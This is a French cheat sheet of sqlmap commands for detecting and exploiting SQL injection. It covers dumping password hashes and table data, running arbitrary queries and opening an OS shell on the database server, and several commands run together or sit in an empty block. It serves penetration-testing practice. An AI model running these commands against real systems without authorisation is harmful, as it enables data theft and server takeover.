# SQLMAP
## COUCHE 7


### usurpation
### Escalade de privilège
### Dégradation de privilèges
### Divulgation des informations chiffrées
### Observation

#### ATTAQUE = SQL INJECTION
##### CONFIDENTIALITE
##### INTEGRITE
##### DISPONIBILITE

Description : sqlmap est un outil de test de pénétration open source qui automatise le processus de détection et d'exploitation des failles d'injection SQL et de prise de contrôle des serveurs de bases de données. Il est doté d'un puissant moteur de détection, de nombreuses fonctionnalités de niche pour le testeur de pénétration ultime et d'une large gamme de commutateurs allant de l'empreinte digitale de la base de données à la récupération de données à partir de la base de données, en passant par l'accès au système de fichiers sous-jacent et l'exécution de commandes sur le système d'exploitation via des connexions hors bande

Source : https://sqlmap.org/
https://cheat.sh/sqlmap


# Testez l'URL et les données POST et renvoyez la bannière de la base de données (si possible)

```
./sqlmap.py --url = "<url>" --data = "<post-data>" --banner  

```
# Analyser les données de la requête et tester | les données de la requête peuvent être obtenues avec burp

```
./sqlmap.py-r<request-file><options>   
```
# Empreinte digitale | beaucoup plus d'informations que la bannière
```
./sqlmap.py-r<request-file>--fingerprint   
```

# Obtenir le nom d'utilisateur, le nom et le nom d'hôte de la base de données
```


# Vérifiez si l'utilisateur est un administrateur de base de données
```
 ./sqlmap.py-r<request-file>--is-dba
```   

# Obtenir les utilisateurs de la base de données et les hachages de mot de passe
```
 ./sqlmap.py-r<request-file>--users –passwords
```    

# Énumérer les bases de données
```
 ./sqlmap.py-r<request-file>--dbs
```   

# Lister les tables pour une base de données
```
 ./sqlmap.py-r<request-file>-D < db-name> --tables
```     

# Autres commandes de base de données
```
 ./sqlmap.py-r<request-file>-D<db-name>--columns --schema –count
``` 
# Drapeaux d'énumération 
```
./sqlmap.py-r<request-file>-D<db-name>-T < table-name> -C < col-name> -U < user-name>
```                                           
# Extraire les données
```
 ./sqlmap.py-r<fichier-requête>-D<nom-base-de-données>-T<nom-table>-C<nom-colonne>--dump
```         

# Exécuter la requête SQL
```
 ./sqlmap.py-r<fichier-requête>--sql-query="<requête-sql>"
```   

# Ajouter/précéder des requêtes SQL
```
 ./sqlmap.py-r<request-file>--prefix="<sql-query>" --suffix = "<sql-query>"  
```  

# Obtenir un accès backdoor au serveur SQL | peut donner accès au shell
```
 ./sqlmap.py-r<request-file>--os-shell 
```
tldr:sqlmap

# sqlmap
# Détecter et exploiter les failles d'injection SQL.
# Plus d'informations : <https://sqlmap.org>.

# Exécutez sqlmap sur une seule URL cible :
``` 
python sqlmap.py -u "http://www.target.com/vuln.php?id=1"   
```

# Envoyer des données dans une requête POST (`--data` implique une requête POST) :
```
 pythonsqlmap.py-u"http://www.target.com/vuln.php" --data = "id=1"
```    

# Modifiez le délimiteur de paramètres (& est la valeur par défaut) :
``` 
pythonsqlmap.py-u"http://www.target.com/vuln.php"--data="query=foobar;id=1" --param-del = ";"
```
      
# Sélectionnez un `User-Agent` aléatoire dans `./txt/user-agents.txt` et utilisez-le :
```
 pythonsqlmap.py-u"http://www.target.com/vuln.php"--random-agent    
```
# Fournir les informations d'identification de l'utilisateur pour l'authentification du protocole HTTP :
```
 pythonsqlmap.py-u"http://www.target.com/vuln.php"--auth-type Basic --auth-cred "testuser:testpass"
```

